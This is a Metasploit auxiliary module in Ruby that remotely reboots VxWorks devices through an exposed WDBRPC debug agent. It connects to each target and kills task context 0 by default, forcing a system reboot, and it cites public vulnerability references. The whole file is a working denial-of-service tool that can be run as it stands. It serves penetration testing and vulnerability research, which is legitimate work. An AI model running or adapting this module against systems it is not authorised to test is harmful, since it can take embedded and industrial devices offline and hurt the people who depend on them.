##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::WDBRPC_Client
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'VxWorks WDB Agent Remote Reboot',
      'Description'    => %q{
        This module provides the ability to reboot a VxWorks target through WDBRPC
      },
      'Author'         => [ 'hdm'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['OSVDB', '66842'],
          ['URL', 'http://blog.metasploit.com/2010/08/vxworks-vulnerabilities.html'],
          ['US-CERT-VU', '362332']
        ],
      'Actions'     =>
        [
          ['Reboot']
        ],
      'DefaultAction' => 'Reboot'
      ))

    register_options(
      [
        OptInt.new('CONTEXT', [ true, "The context to terminate (0=system reboot)", 0 ])
      ])
  end

  def run_host(ip)

    wdbrpc_client_connect

    membase = @wdbrpc_info[:rt_membase]
    memsize = @wdbrpc_info[:rt_memsize]
    mtu     = @wdbrpc_info[:agent_mtu]
    ctx     = datastore['CONTEXT'].to_i

    print_status("#{ip} - Killing task context #{ctx}...")

    wdbrpc_client_context_kill( (ctx != 0) ? 3 : 0, ctx )

    print_status("#{ip} - Done")

    wdbrpc_client_disconnect
  end
end
